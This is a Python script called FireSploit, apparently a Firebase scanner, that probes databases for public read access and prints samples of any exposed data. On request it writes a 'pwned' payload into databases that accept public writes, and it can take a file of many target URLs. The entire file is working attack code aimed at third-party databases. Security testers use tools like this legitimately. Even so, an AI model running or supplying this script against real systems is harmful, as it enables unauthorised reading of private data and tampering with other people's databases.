#!/usr/bin/env python3

"""
FireSploit - Firebase Public Access Scanner

Author: Shubham Sharma
GitHub: https://github.com/secshubhamsharma/FireSploit
"""

import requests
import argparse
import json
from datetime import datetime
from typing import List


def current_timestamp() -> str:
    return datetime.now().isoformat()


def check_public_read(database_url: str) -> bool:
    test_url = f"{database_url}/.json"
    print(f"\n[+] Checking public read access: {test_url}")
    print(f"[*] Scan started at: {current_timestamp()}")

    try:
        response = requests.get(test_url, timeout=5)
        if response.status_code == 200 and response.json():
            print("[!] Public read access detected.")
            preview = json.dumps(response.json(), indent=2)
            print("[*] Sample response:")
            print(preview[:500] + "...\n")
            return True
        else:
            print("[✓] No public read access.")
            return False
    except requests.exceptions.RequestException as error:
        print(f"[x] Connection error: {error}")
        return False


def try_public_write(database_url: str) -> None:
    payload_url = f"{database_url}/pwned.json"
    timestamp = current_timestamp()
    payload = {
        "pwned": True,
        "by": "FireSploit",
        "timestamp": timestamp
    }

    print(f"\n[+] Attempting public write access: {payload_url}")
    try:
        response = requests.put(payload_url, json=payload, timeout=5)
        if response.status_code == 200:
            print("[!] Public write access detected.")
            print("[*] Payload successfully written:")
            print(json.dumps(payload, indent=2))
        else:
            print(f"[✓] Write attempt rejected. Status code: {response.status_code}")
    except requests.exceptions.RequestException as error:
        print(f"[x] Connection error during write attempt: {error}")


def load_targets_from_file(file_path: str) -> List[str]:
    try:
        with open(file_path, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"File not found: {file_path}")
        return []


def parse_arguments():
    parser = argparse.ArgumentParser(
        description="FireSploit - Firebase public access vulnerability scanner"
    )
    parser.add_argument(
        "--url",
        help="Single Firebase DB URL (e.g., https://yourapp.firebaseio.com)"
    )
    parser.add_argument(
        "--file",
        help="Path to file containing Firebase URLs to scan (one per line)"
    )
    return parser.parse_args()


def main():
    print("FireSploit Scanner v1.1")
    print(f"[*] Executed at: {current_timestamp()}")
    args = parse_arguments()

    if args.file:
        targets = load_targets_from_file(args.file)
        print(f"[*] Loaded {len(targets)} targets from {args.file}")
        for idx, url in enumerate(targets, 1):
            print(f"\n--- [{idx}/{len(targets)}] Target: {url} ---")
            if check_public_read(url):
                choice = input("[?] Attempt write exploit? (y/N): ").strip().lower()
                if choice == "y":
                    try_public_write(url)
    elif args.url:
        if check_public_read(args.url.rstrip("/")):
            choice = input("Attempt write exploit? (y/N): ").strip().lower()
            if choice == "y":
                try_public_write(args.url.rstrip("/"))
    else:
        print("Error: You must provide either --url or --file")


if __name__ == "__main__":
    main()
